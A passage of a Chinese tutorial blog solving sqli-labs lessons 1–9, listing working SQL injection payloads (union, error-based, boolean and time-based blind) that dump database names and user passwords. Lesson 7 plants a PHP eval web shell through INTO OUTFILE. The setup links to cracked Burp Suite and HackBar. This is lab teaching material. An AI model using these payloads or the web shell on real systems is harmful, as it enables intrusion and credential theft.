        <content type="html"><![CDATA[<h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1 准备工作"></a>1 准备工作</h1><p>国光师傅太强了，准备写 sqli-labs 的博客，发现国光师傅已经写过了。不过俺的思路还是有一些不同之处。</p><ul><li>Sqli-labs 下载地址：<a href="https://github.com/skyblueee/sqli-labs-php7%E3%80%82">https://github.com/skyblueee/sqli-labs-php7。</a><blockquote><p>通常下载 Sqli-labs 时，会下载到最初的那个 sqli-labs，但是并不适用于PHP7。</p></blockquote></li><li>Burp Suite 下载地址：<a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li><li>Hackbar 下载地址：<a href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li><li>Navicat：可以用来写 SQL 语句，有自动补全功能。</li></ul><p>我使用VScode来运行 sql-labs，国光师傅使用的是 Docker 安装。对于我这种菜鸡，还是先采用复杂的方法吧。</p><h1 id="2-基础挑战-1-20"><a href="#2-基础挑战-1-20" class="headerlink" title="2 基础挑战(1-20)"></a>2 基础挑战(1-20)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>闭合方式是非常关键的一步，能正确的闭合 SQL 语句，SQL 注入工作结束一半。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1       # 可以看到登陆的用户名和密码</span><br><span class="line">?id&#x3D;1&#39;      # SQL报错（1&#39;&#39; LIMIT 0,1），并且可以看到部分 SQL 语句（说明存在 SQL 注入）。报错显示 SQL 语句中使用两个单引号导致错误（传参引入的单引号+原来的 SQL 语句中原有的单引号），可以在传参引入的单引号后添加注释符来注释后面那个单引号）。</span><br><span class="line">?id&#x3D;1&#39;#     # 报错。原因：在URL中GET可能作为锚点,无法传到后端。所以该用--+，--+的传入后端url解码后是-- （注意空格），当然也可以采用%23（手动url编码）</span><br><span class="line">?id&#x3D;1&#39;%23   # 正常回显</span><br><span class="line">?id&#x3D;1&#39;--+   # 正常回显（SELECT * FROM users WHERE id&#x3D;&#39;1&#39; --+&#39; LIMIT 0,1）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果需要分析 SQL 注入的 SQL 变化，可以考虑修改源码来观察 SQL 语句。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/77218F39-FAF6-4918-A148-1FA5C031B27B.png"><br>这里有个值得思考的测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1%23 # SQL语句：SELECT * FROM users WHERE id=&#x27;1#&#x27; LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>按照正常思路，应该什么也查不到才对，结果却能正常查询id=1。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114162823.png"><br>我们可以考虑在 Navicat 中进行测试，确定这种查询真实存在。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E4F6DD5A-3000-4D14-BFC8-20E3F2ACEE6E.png"></p><p>上面这两种查询的结果都是一样的，非常奇怪吧？</p><p>和PHP的弱类型一样，MySQL也有弱类型，在闭合 SQL 语句时是会经常用到的。具体可以参考下面这片文章：<a href="https://blog.csdn.net/HaHa_Sir/article/details/93666147">MySQL 字符串类型用数字可以查出来 MySQL字符串类型会转换成数字 MySQL隐式类型转换</a>。</p><p>开始搜集数据库中的数据，常见的信息搜集有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">system_user()     系统用户名</span><br><span class="line">user()            MYSQL用户名 </span><br><span class="line">current_user()    当前用户名</span><br><span class="line">session_user()    连接数据库的用户名</span><br><span class="line">database()        当前数据库名</span><br><span class="line">schema()          当前数据库名</span><br><span class="line">version()         当前数据库版本信息</span><br><span class="line">@@version</span><br><span class="line">load_file()       MYSQL读取本地文件</span><br><span class="line"></span><br><span class="line">@@datadir         Location of DB files</span><br><span class="line">@@hostname        服务器主机名</span><br><span class="line">@@basedir         MYSQL 安装路径</span><br><span class="line">@@version_compile_os    操作系统</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单的测试一下常见的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">?id&#x3D;0&#39; union select 1, database(), 3%23</span><br><span class="line"></span><br><span class="line"># 查询数据库版本</span><br><span class="line">?id&#x3D;0&#39; union select 1, version(), 3%23</span><br><span class="line"></span><br><span class="line"># 查询数据库用户</span><br><span class="line">?id&#x3D;0&#39; union select 1, user(), 3%23</span><br><span class="line"></span><br><span class="line">#数据库路径</span><br><span class="line">?id&#x3D;0&#39; union select 1, @@datadir, 3%23</span><br><span class="line"></span><br><span class="line"># 操作系统版本</span><br><span class="line">?id&#x3D;0&#39; union select 1, @@version_compile_os, 3%23</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line"># SELECT GROUP_CONCAT(schema_name) FROM information_schema.SCHEMATA</span><br><span class="line">id&#x3D;0&#39; union select 1, 2, group_concat(schema_name) from information_schema.schemata%23</span><br><span class="line"></span><br><span class="line"># 查询某个数据库的数据表名</span><br><span class="line"># SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;DATABASE()</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+ # hex编码</span><br><span class="line"></span><br><span class="line"># 查询某个数据库的某个表的字段名</span><br><span class="line"># SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;</span><br><span class="line">?id&#x3D;0&#39; union SELECT 1, 2, GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br><span class="line"></span><br><span class="line"># 查询数据表的数据</span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, group_concat(id, username, password) from users --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要更进一步的学习手工注入，可以参考这片文章:<a href="https://www.freebuf.com/articles/web/160352.html">新手科普 | MySQL手工注入之基本注入流程</a></p><hr><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>闭合方式：<code>id=$id</code></p><p>和上一题主要是闭合方式不同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1       # 正常显示</span><br><span class="line">?id&#x3D;1 --+   # 正常显示</span><br><span class="line">?id&#x3D;1&#39;      # 正常显示</span><br><span class="line">?id&#x3D;1&#39; --+  # 错误（并没有看到引号，故该题的闭合方式是数字型）</span><br><span class="line">?id&#x3D;0 union select 1,2, 3 --+       # 回显2，3。说明显示第2个字段和第3个字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和 less-1 的区别：闭合方式。less-1 是字符类型，有单引号包裹。less-2 是 int 类型，不需要单引号。其他注入获取信息的姿势是一样的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;</span><br><span class="line"># 报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line"># 在SQL语句中有小括号（可以在本地先进行测试）。考虑将括号进行闭合</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;) --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;) and 1&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;) and 1&#x3D;0 --+</span><br><span class="line"># 没有数据</span><br><span class="line"></span><br><span class="line">?id&#x3D;0&#39;) and 1&#x3D;1 union select 1,2, 3 --+</span><br><span class="line"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单分析：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 本题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">&#x27;$id&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 前两题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 前三个都只是闭合的方式不同</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br><span class="line"># 依然有括号，尝试闭合括号</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;) --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;) and 1&#x3D;1 --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;) and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;0&quot;) and 1&#x3D;0 union select 1, 2, 3 --+</span><br><span class="line"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单分析：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 本题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">&quot;$id&quot;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 前三题：</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">&#x27;$id&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭合方式不同</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>前面 4 个 lession 都是最基本的注入姿势，并且是能够查询得到返回结果的。按照<code>回显方式</code>来分类的话，我认为可以分为 5 类：</p><ul><li>联合注入</li><li>报错注入</li><li>布尔注入</li><li>延时注入</li><li>其他（DNSlog）</li></ul><p>注意：这里仅按照回显方式分类。很难做到完全 MECE 原则（Mutually Exclusive, Collectively Exhaustive / 相互独立、完全穷尽），通常按照下面的优先原则进行：</p><blockquote><p>联合注入&gt;报错注入&gt;布尔注入&gt;延时注入&gt;其他（DNSlog）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line"># s You are in...........</span><br><span class="line"># 没有用户信息。只能考虑报错注入、布尔注入、时间盲注。</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &quot;1&quot; LIMIT 0,1&#39; at line 1</span><br><span class="line"># 闭合单引号</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line"># 正常输出</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;0&#39; and 1&#x3D;0 union select 1, 2, 3 --+</span><br><span class="line">#  You are in...........，无法得到数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>根据上面的优先级，我们考虑先报错注入开始测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id&#x3D;0&#39; and 1&#x3D;0 union select updatexml(1,concat(0x7e,(select @@version),0x7e),1); --+</span><br><span class="line"># s XPATH syntax error: &#39;~8.0.19~&#39;</span><br><span class="line"># 将 select @@version 进行修改即可查询其他的数据。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：MySQL在执行SQL语句时，某些函数会将子查询的结果显示在报错信息中。更多的报错注入参考：<a href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.322c525cGjiCkg&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn#toc-1">先知社区-MYSQL报错注入的一点总结</a></p><hr><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>尝试使用<strong>布尔注入</strong>进行测试，布尔注入会稍微比较复杂，不过基本原理不算复杂。</p><blockquote><p>基本原理：用true与false去一点点确定信息，汇总之后就能得到整个数据库的信息。如：</p><ul><li>问：数据库名长度大于8？</li><li>答：false</li><li>问：数据库名长度小于8？</li><li>答：false（可以确定数据库的长度为8）</li><li>问：数据库第一个首字母是s？</li><li>答：是</li></ul></blockquote><p>简单验证是否能进行布尔注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用页面内容的显示和不显示，来判断我们查询的内容是什么。将我们想要查询的内容进行拆分，然后逐个判断。例如：想要知道数据库名，我们可以先询问系统：“第一个字符是不是a？”，如果不是，就继续询问是否为b，直到问出结果。然后再去寻找第二个字符。</p><p>常用的函数：</p><ul><li>substr(string string,num start,num length);<br>string为字符串；start为起始位置；length为长度。（mysql中的start是从1开始的）</li><li>left()(str,length);str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;a&quot;  --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;s&quot;  --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 8)&#x3D;&quot;security&quot;  --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 8)&#x3D;0x7365637572697479  --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br></pre></td></tr></table></figure>我们将中间的database()，替换成其他的SQL语句就可以查询其他的结果了。</li></ul><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>时间盲注通常在看不到任何回显信息的时候尝试，时间盲注是在布尔注入的基础上的。布尔注入是利用网站自带的回显，而时间注入则是将 true 和 false 转化为不同的等待时间。直接修改上面的 Payload 可得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(substr(database(), 1, 8)&#x3D;0x7365637572697479, sleep(5), 1)  --+</span><br><span class="line"># 有明显的延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单分析：<br>这个 lession 和前面的不同点在于回显方式。这个 lession 并不会像先前一样，显示并返回查询到的信息，而是告诉你是否正确。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysqli_query($con1, $sql);</span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;    </span><br><span class="line">      <span class="comment">// 关键语句</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>闭合方式:<code>id=&quot;$id&quot;</code></p><p>测试闭合方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line"># s You are in...........</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot; --+</span><br><span class="line"># 正常显示（）</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot; and 1&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot; and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将 and 后的式子替换为 less-5 中的报错注入、布尔注入和时间注入即可。</p><hr><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;)) --+</span><br><span class="line"># 闭合SQL语句</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;)) union select 1, 2, &#39;&lt;?php @eval($_POST[&quot;pwd&quot;]) ?&gt;&#39; into outfile &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;shell.php&#39;--+</span><br><span class="line"># 会将查询结果保存到服务器端的目录下。可以考虑写入服务器后台</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后使用蚁剑进行连接即可 getshell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8F46C7D8-A92A-4165-BBD9-4C81A65E76F7.png"></p><hr><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>和前面几题不同点在于：不输出报错信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line"># You are in...........</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;1--+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;0--+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line"># 考虑参考less-5中的布尔注入进行测试</span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;a&quot;  --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;s&quot;  --+</span><br><span class="line"># 正常显示，修改函数的内容，即可得到后面的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>无论怎么输入都是返回 You are in……。考虑使用时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and sleep(3) --+</span><br><span class="line"># 使用--+或者%23，如果使用#浏览器可能不进行url编码</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此处id=1，并且发现有延时。</p><p>这里依然考虑使用 if 语句来进行时间盲注（if 语句挺像C语言的三目运算符的）。类似前面的方法，使用 if+sleep 来先获取数据库名字的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 